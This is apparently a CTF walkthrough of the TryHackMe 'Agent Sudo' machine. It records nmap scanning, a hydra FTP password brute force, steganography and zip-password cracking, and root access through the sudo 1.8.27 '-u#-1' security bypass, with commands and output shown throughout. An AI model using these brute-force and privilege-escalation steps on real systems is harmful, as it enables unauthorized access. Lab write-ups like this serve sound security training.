@@ -1,0 +1,262 @@
+hello friends, new and fun walkthrough welcome
+Scans, enumerations, etc., by following the necessary steps in this CTF. We will try to root our machine and try to finish it, I hope you have fun, have a good read in advance
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap -Pn -n -p- -T4 -A  [TARGET_İP] -oN fullscan -vv
+------------------------------------------------------
+Scanned at 2022-01-17 13:50:06 EST for 706s
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
+|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Annoucement
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=1/17%OT=21%CT=1%CU=43490%PV=Y%DS=2%DC=T%G=Y%TM=61E5BD2
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ(
+OS:SP=FF%GCD=1%ISR=10C%TI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%TS=A)OPS
+OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Uptime guess: 29.076 days (since Sun Dec 19 12:11:52 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=255 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R 
+
+,While visiting the port 80 website I got a clue that I can access the site as 'codenames'. After the clue information I found, I tried to get information by trying all the letters in the alphabet and I was successful.  [" A - Z "]
+
+---curl -A "*" -L  [TARGET_İP]
+------------------------------
+*************************Attention c****, <br><br>*******************************
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+we found a username c****
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I tried as ssh first, but I thought it was something wrong because the process was taking too long and i tried to do it as ftp and it was successful.
+
+hydra -l c**** -P /usr/share/wordlists/rockyou.txt ftp://[ TARGET_İP ]/
+-----------------------------------------------------------------------
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-17 14:52:08
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://[ TARGET_İP ]/
+********************************[21][ftp] host: [ TARGET_İP ] login: c****   password: c****** 
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-17 14:53:20
+nice, we found password..
+We have already cracked the ftp password and we are trying to login.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ftp [TARGET_İP] -p 21
+-----------------------
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
+drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+ftp> get To_agentJ.txt
+ftp> get cute-alien.jpg
+ftp> cutie.png
+
+"Note : We can download all of them with the 'mget *' command instead of typing them one by one."
+then we review the downloaded files
+
+cat To_agentJ.txt 
+-----------------
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Then we try to find the hidden thing in the pictures with the help of steghide and stegcracker. In most of the trials, we come back empty-handed. I see, with some research I'm starting to experiment with binwalk.
+
+
+binwalk -e cute-alien.jpg                                                                                       1 ⨯
+-------------------------
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+                                                                                                                        
+binwalk -e cutie.png     
+-----------------------
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+then we see the file as " _cutie.png.extracted "
+cd _cutie.png.extracted after saying the command, we look at the content.
+  ls
+  365  365.zlib  8702.zip  To_agentR.txt
+
+when i try to unzip it also gives an error and pushes to try with zip2john tool
+ü
+  zip2john 8702.zip > zip.hash
+  john zip.hash
+-------------------------------  
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+a****            (8702.zip/To_agentR.txt)     
+1g 0:00:00:02 DONE 2/3 (2022-01-17 15:02) 0.4651g/s 20783p/s 20783c/s 20783C/s ilovegod..Peter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+nice, we found password..
+
+When I try again with unzip, it does not return a password query and when I say 7z e 8702.zip and give the password, we successfully complete the zip cracking process.
+Let's take a look inside
+
+cat To_agentR.txt
+-----------------
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+We get a password that is hidden with encode. I try all base encodes in the form of base** and I find it encoded with base**. We found the password, great.
+  QXJlYTUx basexx decode A****1
+We try again with the password we broke with the steghide tool and we succeeded, let's take a look at the message.txt content
+
+steghide extract -sf cute-alien.jpg 
+-----------------------------------
+Enter passphrase: A****1
+wrote extracted data to "message.txt".
+cat message.txt
+---------------
+Hi j****,
+
+Glad you find this message. Your login password is h**********!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+c****
+We have obtained the user information that we can connect via ssh. let's try
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ssh j****@[TARGET_İP]
+---------------------
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+  System load:  0.0               Processes:           97
+  Usage of /:   40.2% of 9.78GB   Users logged in:     0
+  Memory usage: 35%               IP address for eth0: 10.10.197.199
+  Swap usage:   0%
+
+
+Last login: Tue Oct 29 14:26:27 2019
+
+j****@agent-sudo:~$ 
+j****@agent-sudo:/tmp$ sudo -l
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/b***
+
+first, I checked the sudo -l output from GTFObins website and followed the steps I needed to follow, but I couldn't reach my goal.
+
+First I checked the output of sudo -l from GTFObins website and followed the steps I needed to follow, but I couldn't achieve my goal. Then I searched for (ALL, !root) /bin/b*** exploit and got the Exploit Title : sudo 1.8.27 - Security Bypass with CVE number and I examined the steps it showed me, the steps are as follows;
+
+sudo -l 
+User hacker may run the following commands on kali:
+    (ALL, !root) /bin/b***
+So user hacker can't run /bin/bash as root (!root)
+User hacker sudo privilege in /etc/sudoers
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+hacker ALL=(ALL,!root) /bin/b***
+With ALL specified, user hacker can run the binary /bin/b*** as any user
+EXPLOIT: 
+sudo -u#-1 /bin/b***
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+last step : Privilege Escalation
+
+j****@kali:~$ sudo -u#-1 /bin/bash
+----------------------------------
+root@kali:/home/hacker# id
+uid=0(root) gid=1000(j****) groups=1000(j****)
+
+
+root@agent-sudo:/# cd root
+root@agent-sudo:/root# ls -la
+total 32
+drwx------  4 root root 4096 Oct 29  2019 .
+drwxr-xr-x 24 root root 4096 Oct 29  2019 ..
+-rw-------  1 root root 1952 Oct 29  2019 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4096 Oct 29  2019 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  197 Oct 29  2019 root.txt
+drwx------  2 root root 4096 Oct 29  2019 .ssh
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b************************************
+
+By,
+D***** a.k.a Agent R
+
+
+That's it for this day. See you next walktrough. Happy Hack day...
+
+
+
+
+
